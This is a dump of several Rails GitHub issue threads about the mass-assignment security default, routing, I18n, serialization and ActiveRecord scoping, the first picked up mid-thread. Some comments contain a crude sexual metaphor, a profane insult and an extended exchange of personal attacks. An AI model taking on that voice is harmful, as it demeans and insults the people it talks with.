GitHub. Also, if this unprepared developer runs in to a lot of gotchas because of having to whitelist stuff, that's good, he or she will learn from them, best way to learn is trial and error. But at least he/she (unless he/she is a total noob, and cba to read docs to clarify what certain things actually do when in doubt and actually uses it wrong) won't be screwed the way GitHub was. Obviously GitHub is at fault here though, not Rails. When I heard the news about the mass-assignment issue + GitHub I thought people were trolling, before I actually read about it. I don't really care whether  blacklists everything by default or not. But from my point of view, by not having it as the default, it has the potential to cause a lot of damage to even experienced developers. Perhaps it's possible to have it on by default, with a flag in  to disable it if it isn't necessary, or the other  way around, since everyone does stuff in the  anyway and will see the option and be like ""oh yeah, *flags it*"". Might just go ahead and do this to be safe Just my two cents.  @friend I like what you say about controllers handling, managing and controlling business logic. Code runs faster in controllers than in models. The TDD fanatics like to put all business logic in the models because it is easier to test, but they apparently don't care about how fast it runs (the client can pay more for that later.) But I disagree about not filtering data in controllers. When you are working with complex data relationships, it may be necessary to place some of the filtering logic in the controller; but that logic is the app developer's responsibility, no special rails constructs are required. People need to realize the examples, even in the books, are simplistic. But sure, why not blacklist all mass assignment and require the dev to use attr_accessible, nothing wrong with that.  @friend Well done ) It's github's admins fault, the man did all he could. It's time people start listening when things like these come by. Again, well done, fully applaud.  Agreed.  Sorry, but all this nonsense about blacklisting by default being annoying is ridiculous.  If attr_accessible is the ""smart"" way to go, then devs should be forced (at the very least encouraged) to use it. On the off chance that they're creating something that requires absolutely no security (seriously?!?), they can deactivate the blacklist for themselves.  Rails is about reasonable conventions over configuration. Reasonable being the key word. In this case @friend proved your conventions are not reasonable. And you ignored him. Lesson learned don't trust rails conventions, they are not reasonable, so if what you just coded works, now sit with the documentation, read it all and check all possible options to find out what do the rails dev's screwed and fix it; if you fail to do it and trust their conventions, they will tell you it's your fault. It was foolish to turn @friend away. Just don't goon wit it. BTW I use the attr_accessible and attr_protected in my apps from the very beginning. Anyway I support what @friend proposed.  @friend @friend was said all argument what I would like, so I would like to reply to just this This is absolute true. But, as a framework developer, I can protect my users from security problems caused by framework if it is possible. Developers are not a secretaries or nurses to I shouldn't assume they can't solve their problems but if I can help them to write better and more secure application then I must do it.  Take a breath, and think naturally... In life, people consciously and loudly choose to tote themselves in the nude.  Even simple fashion is considered a statement attr_accesible birthday_suit # read wildcard/regexp attr_accesible keg, midriff, sixpack, love_handles attr_protected sun_dont_shine, knockers, lingere, knicker_bockers attr_protected bunny_suit # read put the hazmat on the bunny  This is an issue of avoiding the dreaded nipslip or more poignantly protecting baby developers from rapists and pedophiles. Seriously, how much can you expect from a five-month-old? Consider another analogy between escaped strings (which Rails quite aptly handles) and consumables. Cereal and arsenic shouldn't mix; medicines are proscribed by experts; and the LSD's for the adventurous. In the end, you choose, but you can't just allow anyone to shove anything into any orifice. Sensible conventions reflect how we think, and thus make languages like Ruby and fameworks like Rails so wonderfully appealing and empowering. Flexibility shouldn't be compromised, of course I'd be pissed if I had to fight to dress myself. But keep the infant in his diapers and sew the long-forgotten crotch holes in your buddy's pants (coughgithubcough.) After all, mistakes are only human. ;D  i think instead of fighting, rails people should find a nice solution for this problem. please  Solution is in the repo, forcing security is enabled by default.  Couldn't rails automatically use the input fields declared within the form_for block to determine what fields are allowed to be posted?  This could be implemented by automatically inserting a special key at the end of the form, then the controller could only allow the declared parameters through to the actions.  Would it be possible to encode the ids of every element in the form?  Using sha1 or something like that.  The form could also contain something that would assist in the decoding of the ids.   The helper methods (form_for , text_field) would handle the encoding and the controller would automatically decode the params,  so it would be transparent to the user.  @friend No, it is not possible, because the  attribute what is really matters. And it is needed for compute params array. And from SHA1 you cannot decode anything, because you do not needed to name your form elements as same as attribute names - it is just a help for you. But, the form-decoding logic is cannot guess what do you want to get in your form, and if the choosen encoding is decodeable, then hacker can decode it relative easily - so it is not a protection, but security through obscurity - not needed, unusable, and does not matter. And form_for is just generates a HTML form. It is not related to handling incoming parameters. And,you cannot restrict incoming parameters on the level of  framework, because it is an application-dependent thing.  On 06.03.2012 2017, Gabor Garami wrote I think he meant attaching a kind of control sum to each form, to allow controllers to automatically verify if there were any additional fields added to the form by an attacker. --  wrzasa &lt;Q&gt;&lt;  Can someone please point out to me a reasonable use case, for a web application, when you don't need to make sure your POSTed data is exactly what you're expecting? I seem to see people think there are cases where not being forced to be explicit about what you allow, would be... needed, apparently. I'd appreciate a case.  On 07.03.2012 1400, Norv wrote There are cases when you don't care, because your model contains only the fileds that the user is allowed to edit, so an attacker would gain nothing. This is the only use case at least loosely connected with what you asked. I can't see any other. Your question is even more important in case of RoR where my use case is never true, becasue every model contains at least updated_at and created_at and in most cases no user should be allowed edited them.  @friend In the real world, there aren't a lot.  One exception is where the data is coming from a ""trusted"" user, e.g. an admin.  Sure, maybe there's fields you want to secure even from an admin, or maybe not, or maybe you just figure it doesn't matter if they want to hack their own app, if they want to go to those lengths. However, not every model deals with POSTed data, and some do but only indirectly. For example, a project I work on imports XML data from a ""trusted"" source, so in these kinds of models, there's no need for security.  There are numerous models in the project like this.  I'd essentially have to attr_accessible every last column, if the default were for all attributes to be blacklisted by default.  This is somewhat arduous, and is somewhat of a maintainability headache, because if the schema changes later on, I have to add those new fields to the attr_accessible list. If we're going to go with a blacklisted-by-default approach, is there some way for me to auto-whitelist every attribute without having to be so explicit as to type out each one?  Probably a simple configuration should be enough blacklisted-by-default , a config to change it to whitelisted-by-default and the option to change it directly in the model at run time. I don't see the problem really and rails has just maked a fool of itself... PD If you advertise you framework as ""even an idiot can make a page in 30 minutes"" you will end up with a lot of idiots writing pages in 30 minutes...  To me it seems obvious from the start that mass assignment should be disabled by default. Otherwise, you add a field on a table, and you have to remember to block it on the model? If the field would be user-assignable, then of course a form would have to be modified to add an input, and at THIS time, you would modify the model, because it is related to the same change. Yii framework in PHP which is very similar to Rails, blocks alls fields by default since the beginning. If this is common practice in the Rails community, I would never trust a Rails application. This is as bad as SQL injection.  Just received an email from GitHub, perhaps related to this issue ""A security vulnerability was recently discovered that made it possible for an attacker to add new SSH keys to arbitrary GitHub user accounts. This would have provided an attacker with clone/pull access to repositories with read permissions, and clone/pull/push access to repositories with write permissions. As of 553 PM UTC on Sunday, March 4th the vulnerability no longer exists.""  Thank you! @friend I was going to point out the commit above - cjcsuhta already mentioned it. Reversing the switch is possible, for one's particular application. The possibility of different sources for the data getting to the model, than http form input, and needing different treatment for them, tells me again that authorization, filtering of the incoming data, and even validation needed for the data, are not really model issues. They may apply on the model, or be aware of it, but they cannot and should not be handled all at model level, otherwise you can't really have flexibility nor security as needed. The handlers of those actions (i.e. controllers, forms, actions classes) should be responsible, directly or indirectly. On the other hand, since in the case of web form data, there is an always-present need for request filtering, authorization, and validation, I find it more than reasonable to address these concerns at the level of a web framework. If it's at the expense of convenience, then at the expense of convenience. Security &gt;&gt; convenience. At most, validation, from this list, may be disputable as to where it belongs, it may be the choice of a particular framework to handle it more tied to the model itself. I just don't see how could the rest be model matters, and in the same time have a both flexible and secure framework for development. (Nevertheless, the commit pointed out above is IMO a step in the right direction, at least it makes sure the defaults will be saner). Side note I'd say admin is not really an exception in the sense of my question, since checking if the current user is an admin means an authorization check.  @friend Congratulations, your name is now on the media  We developers using Rails should not have to write Merb or 0day the repo in order to get core Rails devs to stop saying ""The emperor DOES SO have clothes!""  Core devs, please change your attitude.  We want newly-generated rails apps to have a setting in the application.rb that by-default turns off mass assignment, unless we reverse that setting in the application.rb or on a model by model basis.  This way it's backwards compatible with existing apps too.  Most of us want this.  Stop making us resort to such tactics for anyone on the core team to listen.  @friend you knocking on the open door. Please read back this issue, the future Rails versions will come with enabled enforcement.  @friend indeed, for this issue... but will our attitudes change enough from this experience so that such tactics won't be necessary with other issues?  I see the attitudes as the root cause that made this issue go so long ignored.  And I realize this is more a social thing than a technical thing, so maybe this isn't the right forum for me to keep talking about it, sorry P  Isn't the question of whether mass assignment is enabled or disabled by default a bit of a red herring? I've just posted a question to this effect at SO, if anyone's interested.  @friend Answer is No. User is able to update HIS public key record AND he updates it with new user_id. code  @friend What the fuck, why are you on about babys, rape and pedophiles you sick fuck. oh my god people are so weird nowadays  @friend I was arguing in a convoluted metaphor that the default convention should protect newbie developers (""babies"") from hackers (""pedophiles and rapists"".) Reading the comment now, I do agree it was in poor taste. The analogies were an attempt to make a dry concept humorous, and in retrospect I see can how the comment can be seen as inappropriate. It's been six years since I made that comment, and I was a naive 21-year-old at the time, so please forgive me.  @friend Yeah it's OK, just maybe not speak like that elsewhere or your account might be taken down 😉 ",178,16,1571,0,0,788,54,
rails/rails/5798,0.0489250105,rails,rails,Namespace Routing Behavior differs between development/test and production,4813,76,53,0,2,"Given a routes config with a namespace SomethingControllerapp/controllers/something_controller.rbuninitialized constant SomeNamespaceSomethingControllerapp/controllers/some_namespace/something_controller.rbve seen it happening multiple times now. This is pretty annoying, especially if you have a big test-suite that should prevent something like this from happening. It's hard to explain this to a customer that pays you a bunch of money because you pretend to test ""everything"" ... Please make sure that routing in development and especially in test environments yields the same results as in any other environment.  What's your Rails version? If it's not the latest stable one, it'd be good to test with it. Routes shouldn't be different per environment, something looks very weird D.  but i've seen this issue also in 3.0.x and 3.1.x. if i find the time i will try to reproduce this with 3.2.3 and add an example to reproduce it. it might also be some side-effect of devise or other dependencies... i thought it's worth adding as a bug, cause i've seen it happening multiple times and others might stumble over this too.  Yeah it'd be good to have a way to reproduce it in a bare app. I'll try to take a look later as well, thanks.  i did a minimal app to reproduce the isse  the server and go to  should not give you an error. if you run it in production you get a 404 with an error in the logs  First thing, leave the attitude at the door - nothing gets people more riled up than a sense of entitlement. If you check your  output you'll see that the controller should be namespaced, e.g The controller should be called . The reason that  works in development but not in production is due to a quirk with dynamic constant loading and ruby's constant lookup algorithm. The dynamic constant loading hooks into ruby’s constant lookup by supplying a custom  method, however before that is called ruby will search  for the constant. Since every class has  as an ancestor then it will return any matching top-level constants with the following warning Note that this isn't true for modules, e.g This leads me to suspect that the namespace you're using is a Active Record model - correct? This is why it's always better to post real-world code than pseudo-code - we don't have to guess what you're trying to achieve and often a crucial detail is left out in the translation. As for the testing - again I’m guessing but you're probably doing a functional test of the controller which won't pick up this error since that kind of test bypasses the request stack. If you do a integration test then it should fail as dynamic constant loading is turned off in the test environment The only way to ‘fix’ this issue is by removing the dynamic constant loading which would mean restarting the app every time you changed something in development, which given how everybody complains about boot time wouldn't be acceptable. If you don’t want to namespace the controller then just use a string , e.g  @friend thx for elaborating on the issue. no, we are not using ActiveRecord at all. no, we are not doing functional tests but request spec. i added an example to the code. as what real-world code goes, i added an example app reproducing the error. i am not going to post any code that is under any private repo. i hope you can understand that there are actually people concerned with where their code goes. i am fine with rails not fixing this issue. i won't consider it a quirk, like you did. it's fine if it won't get fixed, but i think it's worth noting. i've seen people falling over it, i did it myself and i think that people will be glad if they find this issue here.  @friend all I was suggesting was you post some of the controller boilerplate code, i.e. method names, class names, etc. - not actual implementations. As inflections are used quite heavily in routing often a inflection issue is masked when people post psuedo-code, hence my suggestion. Regarding your issue, the controller needs to be under the namespace. The fact that it works in development is a quirk of ruby itself which we can't fix - trust me I tried (I can dig out the old lighthouse tickets if you want). One thing puzzling me about you example app - why no test environment file? As soon as you add the standard test.rb file (minus the config for ActiveRecord and ActionMailer) then it fails. Without the test.rb file the environment defaults to development which is not what you want to be testing under.  @friend i removed all the unnecessary code from the application and forgot to re-add the  file when i added the spec. i am still a little irritated, why this works at all. i would have thought that a missing environment file would cause the tests to fail, or prevent rails from booting in test env, because it explicitly sets the env ",26,2,145,0,0,48,3,
rails/rails/594,0.0478518475,rails,rails,Export OrderedHash to XML and JSON,4427,42,67,0,2,"Imported from Lighthouse. Original ticket at  by Damien MATHIEU - 2011-02-17 080723 UTC When exporting OrderedHash objects with to_json or to_xml, they become arrays and doesn't stay as hashes. With those methods, they're exported as if they were hashes.  Imported from Lighthouse. Comment by Damien MATHIEU - 2009-02-07 223546 UTC Did I use the inappropriate method to suggest a patch ?  Imported from Lighthouse. Comment by Damien MATHIEU - 2009-02-10 084012 UTC So I guess not. Whatever. Thanks anyway for not even taking a few seconds to look at my patch.  Imported from Lighthouse. Comment by Eloy Duran - 2009-02-10 094012 UTC How about doing something like the following? This way we won't need to maintain the code for cerating JSON and XML in multiple places.  Imported from Lighthouse. Comment by Eloy Duran - 2009-02-10 094353 UTC Oh btw, that attitude is not very nice. I would have not replied if I had seen your last comment. People are busy with work and busy creating/fixing code that you can use, for free. It's also stated very clear in the explanation in the right hand bar. But I guess you didn't read that. “Then don't get your hopes up. Unless you have a ""Code Red, Mission Critical, The World is Coming to an End"" kinda bug, you're creating this ticket in the hope that others with the same problem will be able to collaborate with you on solving it. Do not expect that the ticket automatically will see any activity or that others will jump to fix it. Creating a ticket like this is mostly to help yourself start on the path of fixing the problem and for others to sign on to with a ""I'm having this problem too""..”  Imported from Lighthouse. Comment by Damien MATHIEU - 2009-02-10 094358 UTC Because if we move from an OrderedHash to an hash, we're losing the order in 1.8 ?  Imported from Lighthouse. Comment by Damien MATHIEU - 2009-02-10 094549 UTC And sorry for the harsh message. I must admit that it's quite frustrating to see other tickets being assigned or at least having someone show an interest to it and feel alone with his ticket not being replied ;)  Imported from Lighthouse. Comment by Eloy Duran - 2009-02-10 095104 UTC Yes that's true, but is it important for JSON and XML? (I don't know) I understand, but such emotional messages never help. But enough about this.  Imported from Lighthouse. Comment by Damien MATHIEU - 2009-02-10 095332 UTC Well in my case it was. I have a date for every key of the hash (in the format ""YYYY-MM-DD) and I need it to be ordered by date, even when I give it in json or xml (otherwise the application using the feed need to reorder it).  Imported from Lighthouse. Comment by Eloy Duran - 2009-02-10 100533 UTC At least in JSON the spec (json.org) says clearly “An object is an unordered set of name/value pairs. An object begins with { (left brace) and ends with } (right brace). Each name is followed by  (colon) and the name/value pairs are separated by , (comma).” From googling it seems that in XML the same applies, but I haven't found a definitive answer yet so you'd have to look this up more thoroughly.  Imported from Lighthouse. Comment by Eloy Duran - 2009-02-10 100745 UTC Maybe someone on rubyonrails-core@friend.com knows this about XML?  Imported from Lighthouse. Comment by Nate Wiger - 2009-02-10 130352 UTC In XML, order may or may not matter. It's application-dependent. My opinion writing your app to rely on Rails to spit out XML/JSON automatically in some order (ASCII order?) is a bad idea.  It's not actually part of either the JSON or XML specs to do so.  It's a fragile approach. I'm not against this patch, but kazhar, I would strongly suggest a different approach for your app.  It is quite likely, since this is NOT a formally-defined behavior for JSON/XML, that sometime in the future a subsequent patch will get applied which will revert this behavior. Just write a .rxml and spit it out ordered by date.  Or create an ActiveRecordBase subclass with ""abstract_class = true"" that overrides the to_xml/to_json methods.  Use the Ruby sort method and spit out what you need.  Imported from Lighthouse. Comment by Eloy Duran - 2009-02-10 133123 UTC Also, I just remembered OrderedHash is a subclass of Hash nowadays, so this probably already works as it should in 2.3. (That is, dumping as an unordered hash).  Imported from Lighthouse. Comment by Jeremy Kemper - 2010-05-04 174839 UTC [bulk edit]  Attachments saved to Gist ",14,2,194,0,0,288,6,
rails/rails/703,0.06652425000000001,rails,rails,I18n locale may be reset to :en if called from a plugin/gem,5378,52,92,0,1,"Imported from Lighthouse. Original ticket at  by Nicolas Blanco - 2011-02-17 064814 UTC How to reproduce  Create a new Rails 3 beta 4 app, set the default_locale to fr (or whatever) in application.rb (and put the correct yml file). Run a rails console. Check that I18n.locale is the right default_locale you've just set. Now create a fake plugin  create a folder ""foo"" in vendor/plugins, create the file vendor/plugins/foo/init.rb with a call to I18n.translate in it, like  Run the Rails console in development mode and in production mode. In my case the locale is reset to en. This is a problem because many gems and plugins use I18n.t for example translating error messages in models... Note  this problem does not occur in Rails 2.3.x.  Imported from Lighthouse. Comment by Falk Pauser - 2010-08-18 154755 UTC I am using rails3-rc1 and have a similar issue. In config/application.rb I set config.i18n.default_locale = de after putting a de.yml into ""config/locales"". In development-mode everything is just fine, I18n.locale and I18n.default_locale return de in rails-console. At the production-server I18n.default_locale is de too, but I18n.locale gives en without any obvious reason...  Imported from Lighthouse. Comment by Falk Pauser - 2010-08-19 084941 UTC Just tried the current ""3-0-stable"" branch - same effect.  Imported from Lighthouse. Comment by Nicolas Blanco - 2010-08-21 184704 UTC The only workaround I've found in to set the locale again in an initializer... bad...  Imported from Lighthouse. Comment by cabgfx - 2010-09-11 161429 UTC Hi, I've experienced the same problem, with Rails 3.0.0. My app also bundles authlogic 2.1.6, which seems to cause the effect. I've fixed it for now, by brute-forcing config.i18n.locale = da, in /config/environments/production.rb. I'd assume this shouldn't be necessary, since I already have config.i18n.default_locale set in /config/application.rb ? This issue has also been discussed on the Google Group  Imported from Lighthouse. Comment by Robert Pankowecki - 2010-09-11 185240 UTC When 'rails c' is run you can see That is because you try to translate sth in plugin init.rb file and the translation is done until I18n configuration is fully loaded. Furthermore; using rails c shows that the available_locales' are cached in the I18n library the first time they are used as you can see. In other words Gem or plugin should not try to translate anything until all initializers are run. I would say it is gem/plugin or I18n fault, not rails.  Imported from Lighthouse. Comment by David Trasbo - 2010-09-11 211035 UTC I definitely agree with Robert. It's not Rails' fault and this can almost certainly be closed.  Imported from Lighthouse. Comment by Rodrigo Rosenfeld Rosas - 2010-09-12 134533 UTC This is a sad attitude. This remembers me the way Grails developers treat their issues. They provide GORM for ORM but rely on Hibernate and when there is some issue with GORM the mark the issue as ""won't fix"" because this is Hibernate fault, not Grails' as if the user had the chance to use another framework with GORM. I18n is the only supported way of adding internationalization support to Rails. It just happens that it is a separate gem that Rails is taking advantage of, but if i18n is broken in Rails it doesn't mean it is not Rails fault and that issues should be marked as invalid. If the i18n gem is not good enough for Rails (which is not the case), then should think in another way of getting i18n in Rails. Not simply telling it doesn't care about i18n and it won't try to fix any related issues even if the source isn't exactly in rails repository. Besides that, it is not clear to me that this is a i18n issue instead of a Rails one. I still think the problem is in Rails, not on i18n itself. Rails should assure the order in which the calls are done to ensure the plugins will have i18n loaded before their initialization code gets executed...  Imported from Lighthouse. Comment by Rohit Arondekar - 2010-09-12 140021 UTC Rodrigo, firstly I'm not a core member so the issue is not closed forever! ) Secondly, I apologize, I did rush through the ticket. Also I usually leave a friendly ""closing now, if you still think this is an issue then leave a comment and I'll reopen it"" comment while closing an issue. Assigning ticket to an author of the i18n gem for confirmation as to whether this is a i18n issue, gem/plugin issue or an issue with Rails. In the mean time if it's at all possible can you try writing a failing test for rails? That's usually the best way to demonstrate that it's a Rails issue.  Imported from Lighthouse. Comment by Rodrigo Rosenfeld Rosas - 2010-09-12 141339 UTC Hi Rohit, thank you for reopening the ticket. I've actually isolated the problem in June 14 (one day after my birthday ) ), in the Google Group discussion commented by cabgfx. We don't even need any plugin for reproducing the issue. I'm just not sure how to write some test of this kind. If someone could suggest me any approach (what subproject, and how to simulate Rails loading, preferencially in a fast way that won't impact too much on test run speed) I could try to write one...  Imported from Lighthouse. Comment by Ryan Bigg - 2010-10-09 205519 UTC Automatic cleanup of spam.  Imported from Lighthouse. Comment by Roger Campos - 2011-02-25 224913 UTC This commit from Saimon Moore maybe should fix this ticket. ",19,0,238,0,0,211,3,
rails/rails/7896,0.05844486,rails,rails,HTML::Document fails to infer closing tag when final node has no children,2182,25,41,0,0,"HTMLDocument.new(""&lt;body&gt;&lt;br /&gt;"").root.to_s =&gt;  ""&lt;body&gt;&lt;br /&gt;&lt;/body&gt;""  Note that in the above example, the closing \&lt;/body&gt; tag is correctly inferred.  To be consistent, HTMLDocument should behave with HTMLDocument.new(""&lt;body&gt;"").root.to_s =&gt;  ""&lt;body&gt;&lt;/body&gt;""  However, the actual output is &lt;body&gt;  This is the root cause of the fact that testing failed to catch #7894.  what's this about? Can you add description to this so people can understand what you are talking about?  After investigating the issue included with this PR, I saw that  returns invalid html because it does not close the -tag with . ♠&lt;%= form_tag '/posts' %&gt;form_tag` with an empty string though, wouldn't it be better to enforce people passing a block when using this helper?  Ayrton,  I came across the bug in #7894 because I was trying to use  without a block, which is not the same as without an action (i.e. '/posts').  It's not for you to judge ""why anyone would want"" to do this--there are legitimate uses, and enforcing that people should only be able to use form_tag in the ways that an individual programmer was able to think up is not a very open-source attitude.  Why should I be limited to generating the form element's children on the server when sometimes it's more practical to use Javascript?  Your comments are not pertinent to this issue and should have been posted on #7894.  If you'd like to begin a discussion there, I'd be happy to explain to you why form_tag should not require a block or an action.    Closing this in favor of #7894  vijaydev, could you clarify what ""closing in favor of"" means?  It sounds to me like that means you're not going to pull this fix.  #7894 is a distinct issue.  Fixing it doesn't fix this issue, though fixing this issue makes it possible to test #7894.  I mean, let's have one issue/PR where the whole thing is sorted out. You've anyway made a single PR which apparently fixes both issues.  Yes, since #7896 blocked testing of #7894 but could be fixed in isolation, I thought it made sense to wrap them in a single PR but two separate commits.  Was that the right move?  that's fine. ",13,0,156,0,0,48,6,
rails/rails/9894,0.064225103,rails,rails,ActiveRecord.where(hash).create callbacks inherit the where(hash),16448,179,156,0,12,"Running rails 4.0.0-beta1 on ruby 2.0.0-p1. It seems as though when you perform code like the below, the where clauses are inherited by any callbacks it runs. The above exhibits the problem. All of the below function as intended. By debugging on the rails console it reveals This also applies to the first_or_create methods. I'm yet to test the find_or_create methods or the rails 3.x series. Should I write this into an active_record test? Any advice as to where to start? I've created an example application with this problem here  Example class used below.  Hey @friend and thanks for your report. I'm not sure if this is actually a bug. This problem was reported before and you can follow the discussion here #7853 and here #7391. Those tickets were closed because it was the expected behavior. /cc @friend  Right if its working as intended thats fine. In Rails 3 I would have used find_or_create_by_full_name(full_name). I'm just playing with rails 4 a bit and most of the transition documentation said to change that to the where(hash).first_or_create_by. I didn't realise the existence of .find_or_create(hash) until looking into the ActiveRecord code to investigate. Did you want me to document how those methods work anywhere or how things should be changed for compatibilty? Unsure exactly how railsguides and the like work and what happens during changeover between major releases.  If we settle that this is the expected behavior It totally makes sense to document it. The fact that already 3 reports were filed regarding the same problem shows that it's not as ""expected"" as it could be which makes documentation even more necessary. In my opinion the guides should explain how to get a 3.x app running on 4.0 without such complications. I think it would be good to promote . As the described scenario is a combination of different methods on relation it's kind of hard to put it into the rdocs. Methods that always run into this behavior like  could be a good place though. @friend @friend thoughts?  Is  available in 3.2? I've been migrating across to the  recently in my 3.2 apps because it was available and was the way rails seemed to be moving forward. Just figured I'd add my 2c regarding how it looks. I did think the  syntax was really nice before this, especially being able to pass in a block for extra parameters. It looked a lot nicer than the original  methods since you construct it like any other relation and then tack on  to the end. It was the guides like that below and some others which suggested this as a drop in replacement.  idea of just doing  as a work around seems awkward and I would've expected to be equivalent to . I guess it ends up being a question of how often is this desired functionality, how often will it trip people up and how complex is it to ""fix"" right?  Yeah, I think we should promote  since its behavior is closer to the dynamic finders.  Jon implemented find_or_create_by on relation, so let's just document that.  I agree. I kinda consider  and friends to be soft-deprecated, so we should definitely promote  and friends in the docs.  Want me to write something up to that effect in the Rails 4 release notes + upgrading ruby on rails guides?  @friend if you want, please  I'm confused. Rails 4 Release Notes says this ( can be rewritten using find_or_create_by(...) or where(...).first_or_create.  Is this incorrect now? Considering that  is soft-deprecated?  Let's say I had this Model.where(a 1, b 1).first_or_create(c 1)  How can I reproduce this behaviour with new methods? It's sad,  was really useful.  I've updated docrails to try and reflect that the firstor* methods shouldn't be used as drop in replacements for the others. I don't know if there are similar issues with first_or_initialize, but I'm guessing there could be if you did specific things in an after_initialize block.  the changes to magical finders a big enough change to be mentioned in the upgrading_ruby_on_rails guide? Currently there is no mention of them. I can't comment on the soft deprecation status, but can comment on that code. As it stands it would work, but would be very dependent on any callbacks in your model as the scope of the where will effect them as well. If you didn't want to use them to prevent potential issues later you could rewrite it in one of the following ways I liked it the firstor* methods, but if they're too complicated or difficult to maintain I'm not overly attached to them.  @friend Thank you, that was very helpful! thumbsup  Is this still a bug now after changes to  ?  @friend I agree that we should mention it in the upgrading guide. Then I think that we can close it.  Since @friend said the firstor methods are soft deprecated should we only mention the drop in replacements of findor_by() ?  I've done that already in  should I just merge that onto master of docrails?  @friend I have added  based on your changes. You can merge your changes after that gets reviewed.  I don't understand how this issue has been closed. The first report didn't include any  methods as does not my issue #12305. How come they're related or is the documentation still not sufficiently written? Documentation only writes about those dynamic methods, but not telling anything that this code should not work as it did before♠Foo.where(name ""bar"").createFoo.where(name ""bar"").first_or_create(baz ""bar"")`. Are you trying to say with the documentation change which led of closing these issues, that the code above should also not work and it is expected behavior of changing the default scope of the class itself (not even singleton class)?  For reference I'm posting the example from #12305  I'll reopen as we did not change documentation for  in combination with scopes.  As mentioned above, i don't think that the problem is only not being mentioned in the documentation, but the problem is that the class's scope itself is changed, which should not ever happen (unless specified explicitly with default scope, if i'm not mistaken).  I dug around myself before creating this ticket. I was using first or create and found that it was calling first and then ORing the result with create. Thus the problem (as I saw it) was within the create method, so thats how I raised the issue. The reason this was an issue for me (and others) was because first_or_create was the recommended upgrade path from find_or_createby methods in rails 3. This had different behaviour to the original find_or_createby methods so instead I changed documentation to point at the newer find_or_create_by(hash) methods which had the same expected behaviour. I've got no idea if / when the behaviour of MyModel.query_scope.create was changed. Did it behave differently in previous versions of rails or is the comment more that it is unintuitive?  The example code i wrote in issue #12305 worked fine with ActiveRecord 3.x series. The problem arised when i upgraded to 4.0.  It seems like the problem is that the lifecycle hooks/callbacks are being evaluated within a scope. What if we were to make all off these hooks be performed without scoped? That is, when would we need/want them to be performed inside a scope?  This issue has been automatically marked as stale because it has not been commented on for at least three months. The resources of the Rails team are limited, and so we are asking for your help. If you can still reproduce this error on the ,  branches or on , please reply with all of the information you have about it in order to keep the issue open. Thank you for all your contributions.  The problem still exists in  - i can reproduce the problem with example described in #12305.  Thanks. We do have a fix for at  I'll link this issue there.  This issue has been automatically marked as stale because it has not been commented on for at least three months. The resources of the Rails team are limited, and so we are asking for your help. If you can still reproduce this error on the ,  branches or on , please reply with all of the information you have about it in order to keep the issue open. Thank you for all your contributions.  The problem still exists in  - i can reproduce the problem with example described in #12305.  @friend Do you realize the bug has been open for 2 years and it's still not fixed? WOW...  @friend its OSS, feel free to open a PR with a fix. Comments like that really aren't helpful. @friend @friend since this has been behaviour for all of the 4.x series is it worth reconsidering what intended behaviour should be given 5 is on the horizon? Possibly more people relying on this behaviour now than not. I'm not sure.  @friend Sorry don't want my name associated with rails/AR ;)  Too late. Your entitlement to the free labor of others is now a permanent marker in the annals of Rails.  @friend lmao When did I say I was using rails? Was just trying to help a friend, I dropped rails/AR years ago mostly because of that kind of issues ;)  Your friend is most welcome to join the community and help device a solution to their issue, if they can do so without your obnoxious entitlement. Please do be on your merry way to whatever community you've found that has either no issues or is willing to tolerate your attitude about them.  @friend You're over reacting my friend, I'm just pointing out true facts. And that's it. There ain't no bad intention. We all have issues but there's way different ways to tackle them. I was reading an interesting article about why is rails community slowly dying (small comparison with node -- which I'm not fan of personally)  and I do believe that is that kind of attitude that leads to it. I'm sorry if you can't distinguish your allies from your enemies.  Your ""true facts"" are as laughable as your claim of ""ally"". Rails is at this point a massive system with an incredibly strong, diligent, and ever-expanding community of users and contributors working on improving it. But there will always be bugs, and this particular bug just wasn't important enough to summon any effort to its fix. Ipso facto. Rails is not a vendor that owes you, or your friend, anything. It's a common space where everyone can contribute their own fixes and improvements, and in return enjoy that in kind from others. You contributed nothing but needless scorn and entitlement. That is not the behavior of an ""ally"". Your post-rationalization for this disgraceful behavior is that the truth of a fact like ""bug X has not been fixed for me in duration Y"" completely side-steps the point. That truth is both trivial and obvious. You're not providing any service of revelation by sharing. The tone in which you chose to, though, was indeed in bad intention. Your clearly meant to, and obviously continue to, belittle the work of thousands of contributors who share their work with all for free. And for what? Do you think anyone will be inspired to help your friend deal with this issue with greater haste because you huffed and puffed? Quite the contrary. Demanding the free labor of others with indignation is no way to inspire their charity. So, again, please pack your entitlement, your banal analysis of the health of Rails, and be gone. Shoo, shoo.  Since we are discussing tends, these are interesting number about what you are complaining here  I think these numbers speak by their self. Yes, I'm aware that this issue is open for 2 years. In fact I'm aware of all the issues on the issue tracker. But my time is limited, my interest too and I try to focus my time on the things that most interest me, because after all I work here not because someone pays me, but because I love to work with this team and use my free time to help people. I'm also aware that this is not a trivial issue to fix and it will require a lot of work and it may break a lot of applications like @friend correctly pointed. I know It will be fixed eventually, because there are so many great people working on this framework that it is just matter of time. Every single day someone new starts to contribute to this framework and it is amazing how a little bit of encouragement can create amazing regular contributors like @friend @friend @friend @friend @friend @friend @friend just to name few. I really don't know if Rails is dying, but I don't care, because the machinery that runs this framework is more alive than ever.  @friend indeed, this is something that we can just change on Rails 5. The issue is assigned to me, we already have some patches, @friend already touched this code too, so I believe we will get it fixed in time to Rails 5.  @friend Actually I don't think you're right. Because now I got your full attention, then people will come watch to see what's happening, and that issue will be work on again. Awareness is the key. ♠Do you realize the bug has been open for 2 years and it's still not fixed?` IS a true fact, and if you want to laugh about it, feel free but then I really wonder what kind of leader you are for ""Your community"". As you see it was not address against anyone, it was just an open statement. I have not asked for anything, nor I said that you owe me anything. Do you think you're going to win that argument by insulting and trolling me? In my humble opinion you should focus on more important thing for ""Your community"" than attacking the ones that want to raise awareness. For my friends we found a way around it, so now it would just be helping ""Your community""... Again, I think your attitude is very disappointing far far away from constructive. You should learn that contributing to a project is not the only way to make it move forward (note that I do not claim I ever did), and you should be grateful to all the people that are still trying to make Rails a better word rather than trolling them for your own sake.  In my experience that is not what happens. In fact this issue is an outlier, for the reasons that I already explained. So even with awareness the fix is still not trivial and I doubt it will be fixed.  @friend I love statistics. Check this out  You left out the  part of your quote, dude, which was kind of the finer end of your shitty point  @friend stay polite please ;). And Yes WOW to express how surprise I was, did not bring much in the conversation, re-mentioning it felt useless to me (don't feed the trolls). Instead of trolling feel free to leave constructive comment and show that you're a grown man. To come back to what Rafael said, in my humble opinion having bug is one things, not documenting and letting them hide into the code is another one.  If we document a bug it is not a bug anymore but a feature smile. Like I said this bug will die, when we think it is time.  😂😂 That's an extreme way of seeing things but why not...  Please leave these wonderful 